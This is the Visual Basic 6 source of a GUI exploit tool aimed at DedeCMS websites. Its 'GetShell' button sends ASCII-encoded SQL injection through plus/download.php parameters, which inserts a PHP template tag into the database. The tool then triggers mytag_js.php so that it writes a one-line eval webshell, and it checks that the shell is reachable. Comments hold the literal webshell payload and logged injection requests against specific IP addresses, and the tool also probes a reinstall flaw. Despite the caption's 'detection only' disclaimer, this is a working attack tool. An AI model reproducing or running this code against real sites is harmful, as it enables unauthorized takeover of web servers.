VERSION 5.00
Begin VB.Form Form1 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "织梦CMS的plus/download.php漏洞编码工具仅用于检测,请不要用于非法入侵"
   ClientHeight    =   8025
   ClientLeft      =   45
   ClientTop       =   375
   ClientWidth     =   12360
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   ScaleHeight     =   8025
   ScaleWidth      =   12360
   StartUpPosition =   3  '窗口缺省
   Begin VB.ListBox List1 
      Height          =   2220
      Left            =   7920
      TabIndex        =   33
      Top             =   3840
      Width           =   4335
   End
   Begin VB.Frame Frame1 
      Caption         =   "About"
      Height          =   1215
      Left            =   7920
      TabIndex        =   29
      Top             =   6240
      Width           =   4335
      Begin VB.Image Image1 
         Height          =   375
         Left            =   240
         Picture         =   "Form1.frx":12BA
         Top             =   240
         Width           =   1500
      End
      Begin VB.Label Label1 
         AutoSize        =   1  'True
         Caption         =   "2013.06.13"
         Height          =   180
         Index           =   14
         Left            =   2640
         TabIndex        =   32
         Top             =   720
         Width           =   900
      End
      Begin VB.Label Label1 
         AutoSize        =   1  'True
         Caption         =   "V1.02版"
         Height          =   180
         Index           =   13
         Left            =   240
         TabIndex        =   31
         Top             =   720
         Width           =   630
      End
      Begin VB.Label Label1 
         AutoSize        =   1  'True
         Caption         =   "丹心 121877114"
         Height          =   180
         Index           =   12
         Left            =   1080
         TabIndex        =   30
         ToolTipText     =   "121877114"
         Top             =   720
         Width           =   1260
      End
   End
   Begin VB.TextBox txtWebCode 
      Height          =   2295
      Left            =   960
      Locked          =   1  'True
      MultiLine       =   1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   28
      Top             =   5160
      Width           =   6855
   End
   Begin VB.TextBox txtEncode 
      Height          =   1455
      Left            =   7920
      MultiLine       =   1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   27
      Top             =   2280
      Width           =   3375
   End
   Begin VB.TextBox Text11 
      Height          =   375
      Left            =   960
      Locked          =   1  'True
      TabIndex        =   23
      Top             =   4680
      Width           =   6855
   End
   Begin VB.CommandButton Command4 
      Caption         =   "加密"
      Height          =   495
      Left            =   11400
      TabIndex        =   22
      Top             =   2400
      Width           =   855
   End
   Begin VB.CommandButton Command3 
      Caption         =   "解密"
      Height          =   495
      Left            =   11400
      TabIndex        =   21
      Top             =   3000
      Width           =   855
   End
   Begin VB.TextBox txtUtf 
      Height          =   375
      Left            =   7800
      TabIndex        =   20
      Text            =   "utf8"
      ToolTipText     =   "GB2312/UTF8/ISO...."
      Top             =   0
      Width           =   1575
   End
   Begin VB.TextBox txtDedeOdayFile 
      Height          =   375
      Left            =   10920
      TabIndex        =   17
      Text            =   "mytag_js.php"
      ToolTipText     =   "mytag_js.php/ad_js.php"
      Top             =   1200
      Width           =   1335
   End
   Begin VB.TextBox txtfild 
      Height          =   375
      Left            =   7800
      TabIndex        =   14
      Text            =   "mytag"
      ToolTipText     =   "mytag/myad"
      Top             =   1080
      Width           =   1575
   End
   Begin VB.ComboBox ComUrl 
      Height          =   300
      Left            =   960
      TabIndex        =   13
      Tag             =   $"Form1.frx":1DD1
      Text            =   "http://www.xxx.com/"
      Top             =   120
      Width           =   6015
   End
   Begin VB.CommandButton Command2 
      Caption         =   "访问主地址"
      Height          =   375
      Left            =   10920
      TabIndex        =   12
      Top             =   120
      Width           =   1335
   End
   Begin VB.TextBox txtOneLoneFile 
      Height          =   375
      Left            =   10920
      TabIndex        =   11
      Text            =   "xx.php"
      Top             =   600
      Width           =   1335
   End
   Begin VB.TextBox txtAid 
      Height          =   375
      Left            =   7800
      MaxLength       =   4
      TabIndex        =   6
      Text            =   "7007"
      ToolTipText     =   "1000以上"
      Top             =   600
      Width           =   1575
   End
   Begin VB.TextBox txtSqlCode 
      Height          =   495
      Left            =   960
      Locked          =   1  'True
      MultiLine       =   1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   5
      Tag             =   "ssss` (aid,expbody,normbody) VALUES(aaa,@`\'`,'{dede:php}file_put_contents(''ccc'',''bbb'');{/dede:php}') # @`\'`"
      Text            =   "Form1.frx":1E7C
      Top             =   1680
      Width           =   11295
   End
   Begin VB.TextBox txtExp 
      Height          =   1575
      Left            =   960
      Locked          =   1  'True
      MultiLine       =   1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   4
      Text            =   "Form1.frx":1F27
      Top             =   2280
      Width           =   6855
   End
   Begin VB.TextBox txtDoSql 
      Height          =   615
      Left            =   960
      Locked          =   1  'True
      MultiLine       =   1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   3
      Text            =   "Form1.frx":1FD1
      Top             =   3960
      Width           =   6855
   End
   Begin VB.TextBox txtOneline 
      Height          =   855
      Left            =   960
      MultiLine       =   1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   1
      Text            =   "Form1.frx":276A
      Top             =   600
      Width           =   6015
   End
   Begin VB.CommandButton Command1 
      Caption         =   "GetShell"
      Height          =   375
      Left            =   9600
      TabIndex        =   0
      Top             =   120
      Width           =   1215
   End
   Begin VB.Label Label2 
      BorderStyle     =   1  'Fixed Single
      Caption         =   "红色标示的文本框,意味着双击文本框即可访问"
      Height          =   375
      Left            =   0
      TabIndex        =   34
      Top             =   7560
      Width           =   12255
   End
   Begin VB.Image Image2 
      Height          =   480
      Left            =   240
      Picture         =   "Form1.frx":279B
      Top             =   6000
      Width           =   480
   End
   Begin VB.Label Label1 
      AutoSize        =   1  'True
      Caption         =   "小马地址:"
      Height          =   180
      Index           =   11
      Left            =   120
      TabIndex        =   26
      Top             =   4680
      Width           =   810
   End
   Begin VB.Label Label1 
      AutoSize        =   1  'True
      Caption         =   "生成:"
      Height          =   180
      Index           =   10
      Left            =   120
      TabIndex        =   25
      Top             =   4080
      Width           =   450
   End
   Begin VB.Label Label1 
      Caption         =   "网页地址:"
      Height          =   180
      Index           =   9
      Left            =   120
      TabIndex        =   24
      Top             =   120
      Width           =   810
   End
   Begin VB.Label Label1 
      AutoSize        =   1  'True
      Caption         =   "code:"
      Height          =   180
      Index           =   8
      Left            =   7200
      TabIndex        =   19
      Top             =   120
      Width           =   450
   End
   Begin VB.Label Label1 
      AutoSize        =   1  'True
      Caption         =   "返回值:"
      Height          =   180
      Index           =   7
      Left            =   120
      TabIndex        =   18
      Top             =   5520
      Width           =   630
   End
   Begin VB.Label Label1 
      AutoSize        =   1  'True
      Caption         =   "php利用文件:"
      Height          =   180
      Index           =   6
      Left            =   9600
      TabIndex        =   16
      Top             =   1200
      Width           =   1080
   End
   Begin VB.Label Label1 
      AutoSize        =   1  'True
      Caption         =   "字段:"
      Height          =   180
      Index           =   5
      Left            =   7080
      TabIndex        =   15
      Top             =   1080
      Width           =   450
   End
   Begin VB.Shape Shape1 
      BackColor       =   &H000000FF&
      BackStyle       =   1  'Opaque
      Height          =   135
      Index           =   3
      Left            =   120
      Top             =   4920
      Width           =   615
   End
   Begin VB.Shape Shape1 
      BackColor       =   &H000000FF&
      BackStyle       =   1  'Opaque
      Height          =   135
      Index           =   2
      Left            =   120
      Top             =   4320
      Width           =   615
   End
   Begin VB.Shape Shape1 
      BackColor       =   &H000000FF&
      BackStyle       =   1  'Opaque
      Height          =   135
      Index           =   1
      Left            =   120
      Top             =   2640
      Width           =   615
   End
   Begin VB.Shape Shape1 
      BackColor       =   &H000000FF&
      BackStyle       =   1  'Opaque
      Height          =   135
      Index           =   0
      Left            =   120
      Top             =   360
      Width           =   615
   End
   Begin VB.Label Label1 
      AutoSize        =   1  'True
      Caption         =   "一句话名称:"
      Height          =   180
      Index           =   4
      Left            =   9720
      TabIndex        =   10
      Top             =   720
      Width           =   990
   End
   Begin VB.Label Label1 
      AutoSize        =   1  'True
      Caption         =   "AID:"
      Height          =   180
      Index           =   3
      Left            =   7080
      TabIndex        =   9
      Top             =   600
      Width           =   360
   End
   Begin VB.Label Label1 
      AutoSize        =   1  'True
      Caption         =   "EXP编码:"
      Height          =   180
      Index           =   2
      Left            =   120
      TabIndex        =   8
      Top             =   2400
      Width           =   720
   End
   Begin VB.Label Label1 
      AutoSize        =   1  'True
      Caption         =   "SQL:"
      Height          =   180
      Index           =   1
      Left            =   120
      TabIndex        =   7
      Top             =   1800
      Width           =   360
   End
   Begin VB.Label Label1 
      AutoSize        =   1  'True
      Caption         =   "一句话:"
      Height          =   180
      Index           =   0
      Left            =   120
      TabIndex        =   2
      Top             =   840
      Width           =   630
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit
'182.118.33.8||/plus/download.php?open=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=35|| INSERT INTO `dede_#downloads`(`hash`,`id`,`downloads`) VALUES('d41d8cd98f00b204e9800998ecf8427e','0',1); ||comment detect
Dim r As Long, strstatus As String

'cfg_dbprefix
'mytag` (aid,expbody,normbody) VALUES(1117,@`\'`,'{dede:php}file_put_contents(''mybak.php'',''<?php eval($_POST[mybak]);?>'');{/dede:php}') # @`\'`
'mytag` (aid,expbody,normbody) VALUES(aaa,@`\'`,'{dede:php}file_put_contents(''ccc'',''bbb'');{/dede:php}') # @`\'`

'/plus/download.php?open=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&

Public Function GetResponse(ByVal url As String, ByVal encoding As String) As String
    Dim XmlHttp As Object
    Dim content As Variant
    On Error Resume Next
    Set XmlHttp = CreateObject("Msxml2.XMLHTTP.5.0") 'New XmlHttp '
    Dim stime
    XmlHttp.Open "GET", url, True
    XmlHttp.send
    While XmlHttp.readyState <> 4
        DoEvents
    Wend
    '    stime = Now '获取当前时间

    '    While XmlHttp.readyState <> 4
    '        DoEvents
    '        ntime = Now '获取循环时间
    '        If DateDiff("s", stime, ntime) > 3 Then getHtmlStr = "": Exit Function '判断超出3秒即超时退出过程
    '    Wend

    content = XmlHttp.responseBody
    'tt = StrConv(XmlHttp.ResponseBody, vbUnicode，&H804)                     '或者StrConv函数，从.ResponseBody得到字符串
    'tt = StrConv(XmlHttp.ResponseBody, vbUnicode)                            '因网页为GB2312，简体版的操作系统也可以不写第三个参数

    If CStr(content) <> "" Then GetResponse = EncodingConvertor(content, encoding)

    r = XmlHttp.Status
    strstatus = XmlHttp.statusText

    Me.Caption = XmlHttp.statusText & ": " & XmlHttp.Status
    Set XmlHttp = Nothing
    If Err.Number <> 0 Then
        GetResponse = ""
    End If
    On Error GoTo 0
End Function

'说明：字符串编码转换
'参数：
'   content: 文本
'   encoding:编码
Public Function EncodingConvertor(ByVal content As Variant, ByVal encoding As String) As String
    Dim objStream As Object
    On Error Resume Next
    Set objStream = CreateObject("Adodb.Stream")
    With objStream
        .Type = 1
        .Mode = 3
        .Open
        .Write content
        .Position = 0
        .Type = 2
        .Charset = encoding
        EncodingConvertor = .ReadText
        .Close
    End With
    Set objStream = Nothing
    If Err.Number <> 0 Then
        EncodingConvertor = ""
    End If
    On Error GoTo 0
End Function

Sub webshellcode()

    Dim s As String, Sid As String, Sphp As String, Sone As String
    Dim scode As String

    s = txtSqlCode.Tag

    s = VBA.Replace(s, "aaa", txtAid.Text) 'id
    s = VBA.Replace(s, "bbb", txtOneline.Text) 'one
    s = VBA.Replace(s, "ccc", txtOneLoneFile.Text) 'd.php
    s = VBA.Replace(s, "ssss", txtfild.Text) 'd.php
    scode = VBA.Replace(s, vbCrLf, "") 'd.php

    txtSqlCode.Text = scode

    txtExp.Text = ComUrl.Text & ComUrl.Tag & fuck_dede(scode)
    txtDoSql.Text = ComUrl.Text & "/plus/" & txtDedeOdayFile.Text & "?aid=" & txtAid.Text
    Text11 = ComUrl.Text & "/plus/" & txtOneLoneFile.Text

End Sub

Function fuck_dede(ByVal strSQL As String) As String
    Dim str As String, i As Long

    For i = 1 To Len(strSQL)
        If i = Len(strSQL) Then
            str = str & "arrs2[]=" & CStr(Asc(Mid$(strSQL, i, 1)))  '函数返回每一个字符的 ASCII 值。
        Else
            str = str & "arrs2[]=" & CStr(Asc(Mid$(strSQL, i, 1))) & "&" '函数返回每一个字符的 ASCII 值。
        End If
    Next
    fuck_dede = str
End Function

Private Sub Command1_Click()
    Dim s As String, mUtf_8 As String

    mUtf_8 = txtUtf.Text

    Dim i As Long

    For i = 0 To 3

        Shape1(i).BackColor = vbRed

    Next
    r = 0
    txtWebCode.Text = GetResponse(ComUrl.Text, mUtf_8)  '网页能否正常访问

    VBA.DoEvents
    If r <> 200 Then

    Else '正常
        Shape1(0).BackColor = vbGreen
        r = 0
        s = fuck_dede(txtSqlCode.Text)
        s = ComUrl.Text & ComUrl.Tag & s
        txtExp.Text = s
        txtWebCode.Text = GetResponse(s, mUtf_8) '开始Getshell
        VBA.DoEvents

        If r <> 200 Then

        Else '正常开始访问
            r = 0
            VBA.DoEvents
            txtWebCode.Text = GetResponse(ComUrl.Text & "/plus/" & txtDedeOdayFile.Text & "?aid=" & txtAid.Text, mUtf_8) '生成WEBSHELL
            Shape1(1).BackColor = vbGreen

            VBA.DoEvents
            '正常开始访问

            r = 0
            txtWebCode.Text = GetResponse(ComUrl.Text & "/plus/" & txtOneLoneFile.Text, mUtf_8) '访问WEBSHELL'
            If r = 200 Then
                Shape1(2).BackColor = vbGreen

                VBA.DoEvents

                Shape1(3).BackColor = vbGreen
                r = 0
                Me.Caption = "成功得到：　" & ComUrl.Text & "/plus/" & txtOneLoneFile.Text  '访问WEBSHELL'
            End If
        End If
    End If
End Sub

Private Sub Command2_Click()
    txtWebCode.Text = GetResponse(ComUrl, txtUtf.Text) ' mUtf_8)
End Sub

Private Sub Command3_Click()

    'txtWebCode.Text = GetResponse("http://www.baidu.com/", mUtf_8)

    Dim s As String, str() As String
    Dim i As Long
    Dim o As String

    s = txtEncode.Text

    s = VBA.Replace(s, vbCrLf, "") 'id

    s = VBA.Replace(s, "&arrs1[]=", "<+>")  'id

    s = VBA.Replace(s, "&arrs2[]=", "<+>") 'one

    str = VBA.Split(s, "<+>", , vbTextCompare)

    For i = LBound(str) + 1 To UBound(str)

        o = o & Chr$(str(i))
    Next

    txtEncode.Text = o

End Sub

Private Sub Command4_Click()
    Dim s As String, str() As String
    Dim i As Long
    Dim o As String

    s = txtEncode.Text

    s = VBA.Replace(s, vbCrLf, "") 'id
    '    s = VBA.Replace(s, "cfg_dbprefix", "") 'id
    '
    '    s = VBA.Replace(s, "&arrs2[]=", "<+>") 'one

    For i = 1 To Len(s)
        o = o & "&arrs2[]=" & Asc(Mid$(s, i, 1))
    Next
    txtEncode.Text = o

End Sub

Private Sub Form_Load()
    webshellcode
    List1.AddItem "织梦版本"
    List1.AddItem "织梦重装漏洞检测"
    List1.AddItem "织梦版本"
    List1.AddItem "织梦版本"
    List1.AddItem "织梦版本"
    List1.AddItem "织梦版本"
    List1.AddItem "织梦版本"
End Sub

Private Sub Form_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
    If VBA.IsNumeric((txtAid.Text)) Then

    Else
        txtAid.Text = "1118"

    End If

End Sub

Private Sub List1_Click()

    If ComUrl.Text <> "http://www.xxx.com/" And ComUrl.Text <> "" Then
        If List1.ListCount > 0 Then
            Select Case List1.ListIndex

            Case 0 '版本

                txtWebCode.Text = GetResponse(ComUrl.Text & "/data/admin/ver.txt", txtUtf.Text)  '网页能否正常访问
            Case 1
                txtWebCode.Text = GetResponse(ComUrl.Text & "/install/index.php.bak?insLockfile=1&step=1", txtUtf.Text)  '网页能否正常访问

            Case 2
                txtWebCode.Text = GetResponse(ComUrl.Text & "/data/admin/ver.txt", txtUtf.Text)  '网页能否正常访问

            Case 3
                txtWebCode.Text = GetResponse(ComUrl.Text & "/data/admin/ver.txt", txtUtf.Text)  '网页能否正常访问

            Case 4
                txtWebCode.Text = GetResponse(ComUrl.Text & "/data/admin/ver.txt", txtUtf.Text)  '网页能否正常访问
            Case Else
            
            End Select
            Debug.Print List1.ListIndex
        End If
    End If
End Sub

Private Sub List1_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
    If ComUrl.Text <> "http://www.xxx.com/" And ComUrl.Text <> "" Then
        If List1.ListCount > 0 Then
            Select Case List1.ListIndex

            Case 0 '版本

                List1.ToolTipText = ComUrl.Text & "/data/admin/ver.txt"   '网页能否正常访问
            Case 1
                List1.ToolTipText = ComUrl.Text & "/install/index.php.bak?insLockfile=1&step=1"  '网页能否正常访问

            Case 2
                List1.ToolTipText = ComUrl.Text & "/data/admin/ver.txt"  '网页能否正常访问

            Case 3
                List1.ToolTipText = ComUrl.Text & "/data/admin/ver.txt"  '网页能否正常访问

            Case 4
                List1.ToolTipText = ComUrl.Text & "/data/admin/ver.txt"  '网页能否正常访问
            Case Else
            
            End Select
            Debug.Print List1.ListIndex
        End If
    End If

End Sub

Private Sub Text11_DblClick()
    txtWebCode.Text = GetResponse(Text11, txtUtf.Text) ' mUtf_8)
End Sub

Private Sub txtDedeOdayFile_Change()
    webshellcode
End Sub

Private Sub txtDoSql_DblClick()
    txtWebCode.Text = GetResponse(txtDoSql, txtUtf.Text) ' mUtf_8)

End Sub

Private Sub txtExp_DblClick()
    txtWebCode.Text = GetResponse(txtExp, txtUtf.Text) ' mUtf_8)

End Sub

Private Sub txtfild_Change()
    webshellcode
End Sub

Private Sub txtOneline_Change()
    webshellcode
End Sub

Private Sub txtAid_Change()
    webshellcode
End Sub

Private Sub txtOneLoneFile_Change()
    webshellcode
End Sub

Private Sub txtSqlCode_Change()
    webshellcode
End Sub

Private Sub ComUrl_Change()
    webshellcode
End Sub

Private Sub ComUrl_DblClick()
    txtWebCode.Text = GetResponse(ComUrl, txtUtf.Text)
End Sub

Private Sub ComUrl_KeyDown(KeyCode As Integer, Shift As Integer)
    If KeyCode = 13 Then

        Command1_Click
    End If
End Sub
'/plus/download.php?id=1&open=2&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=100&arrs2[]=101&arrs2[]=100&arrs2[]=101&arrs2[]=95&arrs2[]=97&arrs2[]=114&arrs2[]=99&arrs2[]=116&arrs2[]=105&arrs2[]=110&arrs2[]=121&arrs2[]=32&arrs2[]=117&arrs2[]=110&arrs2[]=105&arrs2[]=111&arrs2[]=110&arrs2[]=32&arrs2[]=115&arrs2[]=101&arrs2[]=108&arrs2[]=101&arrs2[]=99&arrs2[]=116&arrs2[]=32&arrs2[]=49&arrs2[]=44&arrs2[]=50&arrs2[]=35||SELECT ch.addtable,arc.mid FROM `dede_dede_arctiny union select 1,2#arctiny` arc LEFT JOIN `dede_dede_arctiny union select 1,2#channeltype` ch ON ch.id=arc.channel WHERE arc.id='1' LIMIT 0,1;||SelectBreak
'60.160.168.200||/plus/search.php?keyword=as&typeArr%5B%20uNion%20%5D=a||SELECT channeltype FROM `dede_arctype` WHERE id= uNion LIMIT 0,1;||union detect